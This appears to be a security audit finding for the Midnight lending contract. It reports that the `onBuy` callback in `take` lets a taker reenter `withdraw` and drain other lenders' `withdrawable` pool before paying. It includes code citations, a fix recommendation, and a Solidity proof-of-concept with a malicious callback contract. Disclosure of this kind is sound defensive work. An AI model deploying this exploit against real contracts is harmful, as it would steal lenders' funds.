### Title
`onBuy` Callback Reentrancy Drains `withdrawable` Pool Before Asset Transfer - (`src/Midnight.sol`)

### Summary

In `take`, the buyer's credit is written to storage at line 410 before the `onBuy` callback fires at line 448, and the payer's asset transfer does not occur until lines 455–456 after the callback returns. Because `withdraw` has no reentrancy guard and `withdrawable` is never updated inside `take`, a taker who controls the `buyerCallback` can reenter `withdraw` during `onBuy`, redeem the freshly minted credit against the pre-existing `withdrawable` pool, and then use the received tokens to fund the payer transfer — paying only `buyerAssets < units` while extracting `units` tokens from other lenders' withdrawable balance.

### Finding Description

**Exact code path:**

`take` (sell offer, `offer.buy = false`):
- `buyer = taker` (attacker), `buyerCallback = takerCallback` (attacker-controlled), `payer = buyerCallback`
- Line 410: `buyerPos.credit += UtilsLib.toUint128(buyerCreditIncrease)` — credit written to storage
- Lines 416–417: `_marketState.totalUnits` updated
- Line 448: `IBuyCallback(buyerCallback).onBuy(...)` — external call, no lock set on `withdraw`
- Lines 455–456: `safeTransferFrom(payer, address(this), buyerAssets - sellerAssets)` and `safeTransferFrom(payer, receiver, sellerAssets)` — asset pull happens **after** callback [1](#0-0) 

`withdraw` (called inside `onBuy`):
- Line 482: `isAuthorized[onBehalf][msg.sender]` — satisfied because attacker pre-authorized the callback contract via `setIsAuthorized`
- Line 493: `_position.credit -= units` — succeeds; credit was just set at line 410
- Line 494: `_marketState.withdrawable -= units` — succeeds if `withdrawable >= units`; no guard prevents this during a `take` callback
- Line 499: `safeTransfer(loanToken, receiver, units)` — tokens leave the contract [2](#0-1) 

**Attacker-controlled inputs:**
- `takerCallback` = malicious contract `C` (attacker-deployed)
- `units` = chosen to be ≤ existing `withdrawable`
- `offer.tick` chosen so `buyerPrice < WAD` (discount, normal lending)

**Exploit flow:**
1. Attacker calls `setIsAuthorized(C, true, attacker)`.
2. Market has `withdrawable = W` (from prior repayments by any borrower).
3. Attacker calls `take(sellOffer, ..., attacker, ..., C, ...)` with `units` units.
4. `take` writes `buyerPos.credit += units` (line 410), then calls `C.onBuy(...)` (line 448).
5. Inside `C.onBuy`: `C` calls `midnight.withdraw(market, units, attacker, C)`.
   - `attacker.credit -= units` → 0
   - `withdrawable -= units` → `W - units`
   - `totalUnits -= units` → back to pre-take value
   - Contract sends `units` tokens to `C`
6. `C.onBuy` returns `CALLBACK_SUCCESS`.
7. `take` resumes: `safeTransferFrom(C, address(this), buyerAssets - sellerAssets)` and `safeTransferFrom(C, receiver, sellerAssets)` — `C` pays `buyerAssets` total using the tokens it just received.

**Why existing checks fail:**
- The `LIQUIDATION_LOCK_SLOT` (line 444) only blocks liquidation of the seller; it does not block `withdraw`.
- There is no reentrancy guard on `withdraw` or `take`.
- The Certora formal verification explicitly assumes no reentrancy from callbacks: `"Assumes no reentrancy: callbacks (onBuy, onSell) and token transfers are not modeled as re-entering Midnight"` — meaning this attack path is outside the verified safety envelope. [3](#0-2) 

### Impact Explanation

The attacker extracts `units − buyerAssets = units × (WAD − buyerPrice) / WAD` tokens from the pre-existing `withdrawable` pool. These tokens were deposited by other borrowers' repayments and are owed to other lenders. After the attack, `withdrawable` is reduced by `units` while the attacker's credit is 0 and the new borrower's debt is outstanding but unrepaid. Other lenders holding credit cannot withdraw their proportional share until new repayments refill the pool — their withdrawable entitlement is permanently stolen for the duration. The contract's raw token balance invariant (`balance ≥ withdrawable + claimableSettlementFee`) is preserved, but the `withdrawable` pool no longer covers the other lenders' redemption rights, constituting a direct loss of funds for them.

### Likelihood Explanation

**Preconditions:**
1. `withdrawable > 0` in the target market — satisfied any time a borrower has repaid or been liquidated.
2. A sell offer exists at any tick with `buyerPrice < WAD` — normal discount lending, always present in active markets.
3. Attacker pre-authorizes their callback contract — one `setIsAuthorized` call, no privilege required.

The attack is fully permissionless, requires no oracle manipulation, no admin access, and no special token behavior. It is repeatable in a single transaction and can drain the entire `withdrawable` pool in one call (by setting `units = withdrawable`). Any market with repayment history is vulnerable.

### Recommendation

Apply a reentrancy lock that covers `withdraw` (and other state-mutating functions) during the execution of `take` callbacks. The simplest correct fix is to record a per-market or global "in-take" transient flag (analogous to `LIQUIDATION_LOCK_SLOT`) before the first callback and check it at the top of `withdraw`, reverting if set. Alternatively, move both `safeTransferFrom` calls (lines 455–456) to occur **before** any external callback, following the checks-effects-interactions pattern: pull assets first, then invoke `onBuy`, then invoke `onSell`. This ensures `withdrawable` can only be decremented after the corresponding assets have actually entered the contract. [4](#0-3) 

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {Midnight, Market, Offer} from "src/Midnight.sol";
import {IBuyCallback} from "src/interfaces/ICallbacks.sol";
import {ERC20} from "..."; // standard mock

contract MaliciousBuyCallback is IBuyCallback {
    Midnight public midnight;
    Market public market;
    address public attacker;
    uint256 public storedUnits;

    constructor(Midnight _midnight, Market memory _market, address _attacker) {
        midnight = _midnight;
        market = _market;
        attacker = _attacker;
    }

    function onBuy(
        bytes32, Market memory, uint256 buyerAssets, uint256 units,
        uint256, address, bytes memory
    ) external returns (bytes32) {
        storedUnits = units;
        // Reenter withdraw: redeem freshly minted credit from existing withdrawable pool
        midnight.withdraw(market, units, attacker, address(this));
        // Now approve the payer transfer back to midnight
        ERC20(market.loanToken).approve(address(midnight), buyerAssets);
        return keccak256("CALLBACK_SUCCESS"); // CALLBACK_SUCCESS
    }
}

contract ReentrancyWithdrawTest is Test {
    Midnight midnight;
    // ... setup market, lender, borrower, loanToken

    function testOnBuyReentrancyDrainsWithdrawable() public {
        uint256 units = 1000e18;
        // 1. Existing lender lends `units`, borrower repays → withdrawable = units
        // (setup: lender takes borrower's sell offer, borrower repays)
        // Assert: midnight.withdrawable(id) == units

        // 2. Deploy attacker callback
        MaliciousBuyCallback cb = new MaliciousBuyCallback(midnight, market, attacker);
        vm.prank(attacker);
        midnight.setIsAuthorized(address(cb), true, attacker);

        uint256 withdrawableBefore = midnight.withdrawable(id);
        uint256 attackerBalanceBefore = loanToken.balanceOf(attacker);

        // 3. Attacker takes sell offer (borrower's offer) with malicious callback
        // buyerPrice < WAD so buyerAssets < units
        vm.prank(attacker);
        midnight.take(borrowerSellOffer, hex"", units, attacker, address(0), address(cb), hex"");

        uint256 withdrawableAfter = midnight.withdrawable(id);
        uint256 attackerProfit = loanToken.balanceOf(attacker) - attackerBalanceBefore;

        // Key assertions:
        assertLt(withdrawableAfter, withdrawableBefore, "withdrawable was drained");
        assertGt(attackerProfit, 0, "attacker profited");
        // withdrawable must not go negative (underflow would revert, but if it doesn't revert,
        // assert it equals withdrawableBefore - units)
        assertEq(withdrawableAfter, withdrawableBefore - units, "exact drain");
        // Other lender can no longer withdraw their share
        vm.prank(otherLender);
        vm.expectRevert(); // arithmetic underflow: withdrawable < otherLender's credit
        midnight.withdraw(market, otherLenderCredit, otherLender, otherLender);
    }
}
```

**Expected assertions:** `withdrawable` drops by `units` during the reentrant `withdraw` call; attacker's token balance increases by `units − buyerAssets > 0`; other lenders' subsequent `withdraw` calls revert due to insufficient `withdrawable`.

### Citations

**File:** src/Midnight.sol (L408-456)
```text
        buyerPos.debt -= UtilsLib.toUint128(units - buyerCreditIncrease);
        buyerPos.pendingFee += buyerPendingFeeIncrease;
        buyerPos.credit += UtilsLib.toUint128(buyerCreditIncrease);

        sellerPos.pendingFee -= sellerPendingFeeDecrease;
        sellerPos.credit -= UtilsLib.toUint128(sellerCreditDecrease);
        sellerPos.debt += UtilsLib.toUint128(sellerDebtIncrease);

        _marketState.totalUnits =
            UtilsLib.toUint128(_marketState.totalUnits + buyerCreditIncrease - sellerCreditDecrease);
        claimableSettlementFee[offer.market.loanToken] += buyerAssets - sellerAssets;

        address buyerCallback = offer.buy ? offer.callback : takerCallback;
        address sellerCallback = offer.buy ? takerCallback : offer.callback;
        address payer = buyerCallback != address(0) ? buyerCallback : (offer.buy ? buyer : msg.sender);
        address receiver = offer.buy ? receiverIfTakerIsSeller : offer.receiverIfMakerIsSeller;

        emit EventsLib.Take(
            msg.sender,
            id,
            units,
            taker,
            offer.maker,
            offer.buy,
            offer.group,
            buyerAssets,
            sellerAssets,
            newConsumed,
            buyerPendingFeeIncrease,
            sellerPendingFeeDecrease,
            buyerCreditIncrease,
            sellerCreditDecrease,
            receiver,
            payer
        );

        bool wasLocked = UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, true);
        if (buyerCallback != address(0)) {
            bytes memory buyerCallbackData = offer.buy ? offer.callbackData : takerCallbackData;
            require(
                IBuyCallback(buyerCallback)
                    .onBuy(id, offer.market, buyerAssets, units, buyerPendingFeeIncrease, buyer, buyerCallbackData)
                == CALLBACK_SUCCESS,
                WrongBuyCallbackReturnValue()
            );
        }

        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**File:** src/Midnight.sol (L481-499)
```text
    function withdraw(Market memory market, uint256 units, address onBehalf, address receiver) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        bytes32 id = touchMarket(market);
        MarketState storage _marketState = marketState[id];
        _updatePosition(market, id, onBehalf);

        Position storage _position = position[id][onBehalf];
        uint128 pendingFeeDecrease;
        if (_position.credit > 0) {
            pendingFeeDecrease = UtilsLib.toUint128(_position.pendingFee.mulDivUp(units, _position.credit));
            _position.pendingFee -= pendingFeeDecrease;
        }
        _position.credit -= UtilsLib.toUint128(units);
        _marketState.withdrawable -= UtilsLib.toUint128(units);
        _marketState.totalUnits -= UtilsLib.toUint128(units);

        emit EventsLib.Withdraw(msg.sender, id, units, onBehalf, receiver, pendingFeeDecrease);

        SafeTransferLib.safeTransfer(market.loanToken, receiver, units);
```

**File:** certora/specs/OnlyAuthorizedCanChange.spec (L56-58)
```text
/// An unauthorized caller cannot change a user's credit and debt except via liquidate and updatePosition.
/// Assumes no reentrancy: callbacks (onBuy, onSell) and token transfers are not modeled as re-entering Midnight, so re-entrant credit and debt changes are not covered.
rule onlyAuthorizedCanChangeCreditAndDebtExceptLiquidateAndUpdatePosition(env e, method f, calldataarg args, bytes32 id, address user) filtered { f -> f.selector != sig:liquidate(Midnight.Market, uint256, uint256, uint256, address, bool, address, address, bytes).selector && f.selector != sig:updatePosition(Midnight.Market, address).selector } {
```
